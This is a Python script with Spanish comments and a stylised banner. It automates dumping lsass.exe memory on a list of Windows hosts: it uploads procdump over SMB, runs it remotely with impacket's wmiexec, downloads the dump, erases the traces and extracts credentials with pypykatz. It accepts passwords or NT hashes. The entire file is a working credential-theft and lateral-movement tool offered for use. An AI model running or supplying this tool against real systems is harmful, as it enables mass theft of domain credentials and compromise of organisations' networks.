#!/usr/bin/env python3
# Desarrollado por Omar Peña - Macleod - twitter: @p3nt3ster
uso = """
Este script automatiza el proceso volcar el proceso lsass.exe a un archivo, descargar el archivo volcado y extraer las credenciales.

Prerrequisitos: Procdump64.exe debe estar en el mismo directorio que el script, y los paquetes impacket , smbclient, pypykatz debidamente instalados.

Para instalar requisitos previos:
Descargue procdump64.exe en el mismo directorio que el script.
git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
cd /opt/impacket && pip install -r requirements.txt && python setup.py install
apt install -y smbclient
pip3 install pypykatz

Ejemplos de ejecución:
python3 dumpLsass.py -d dominio -u admin -p Passw0rd -f </root/file con direcciones IP o hostnames.txt>
python3 dumpLsass.py -d dominio -u admin -H <NT Hash> -f </root/file con direcciones IP o hostnames.txt>
"""
import os, argparse, sys, time, signal
from pwn import *

def signal_handler(signal, frame):
  # aqui cualquier código que se requiera previo a la detención
  sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

#banner
banner = """
    ╚══╗ ╔═╔════╝  
  ╚═╦═╗╠═╩═╩╗╔═╦═╗ 
    ║▒╠╣DUMP╠╣▒║▒║ 
  ╔═╩═╝╠═╦═╦╝╚═╩═╝ 
    ╔══╝ ╚═╚════╗  ᗪㄩ爪尸-㇄丂闩丂丂 丨.0
"""
print (banner)
# Argument parser
parser = argparse.ArgumentParser(description="Obtiene un volcado de memoria del progreso de lsass.exe", epilog="Ejemplo de uso: python3 dump-lsass.py -d dominio -u administrator -p Passw0rd -f </root/file con direcciones IP o hostnames.txt>")
parser.add_argument("-d", help="Dominio")
parser.add_argument("-u", required=True, help="Username")
parser.add_argument("-p", required=True, help="Password")
parser.add_argument("-H", help="Hashes")
parser.add_argument("-f", required=True, help="Leer objetivos de archivo. Ejemplo: '-f /root/ips.txt'")
args = parser.parse_args()


if not args.p and not args.H:
    print("\n\nDebe ingresar una contraseña o un hash de contraseña. Saliendo\n\n")
    print(usage)
    sys.exit(1)

with open(args.f, 'r') as fileobj:
    if not os.path.isfile("procdump64.exe"):
        print("[✘] Archivo procdump64.exe no presente. 凸(¬‿¬)凸\n")
        sys.exit(1)
    for row in fileobj:
        host = row.rstrip('\n')
        try:
            print ("\n Host ➡",host,"\n")
            p1 = log.progress('Subiendo archivo procdump al host', host)
            result = os.system(f'smbclient /\/\{host}/\C$ -U {args.u} -W {args.d} {args.p} -c "put procdump64.exe procdump64.exe" > /dev/null 2>&1 && echo $?')
            #print(result)
            if result == 0:
                p1.success("✔ Archivo subido.")
                time.sleep(1)
                p2 = log.progress("Dumping lsass", host)
                os.system(f'wmiexec.py {args.d}/{args.u}:{args.p}@{host} "procdump64.exe -accepteula -64 -ma lsass.exe lsass.dmp" > /dev/null 2>&1')
                p2.success("✔ Volcado de proceso completado.")
                time.sleep(1)
                p3 = log.progress("Descargando lsass.dmp", host)
                os.system(f'smbclient /\/\{host}/\C$ -U {args.u} -W {args.d} {args.p} -c "get lsass.dmp lsass-{host}.dmp" > /dev/null 2>&1')
                p3.success("✔ Archivo lsass.dmp descargado.")
                time.sleep(1)
                p4 = log.progress("Eliminando archivos temporales", host)
                os.system(f'smbclient /\/\{host}/\C$ -U {args.u} -W {args.d} {args.p} -c "rm procdump64.exe;rm lsass.dmp" > /dev/null 2>&1')
                p4.success("✔ Eliminados archivos temporales.")
                time.sleep(1)
                p5 = log.progress("Extrayendo información", host)
                os.system(f'pypykatz lsa minidump lsass-{host}.dmp > lsass-{host}.txt')
                p5.success("✔ Extracción de credenciales finalizada.")
            else:
                p1.failure("Ocurrio un fallo, revise credenciales de accesos")
        except Exception as e:
            log.error(str(e))
            print("[✘] Algo salio mal en este host...")
            break
    print("\n[✔] Proceso finalizado. Verifique los archivos lsass-[host].txt para ver las credenciales!\n\n\thappy hacking ツ\n")
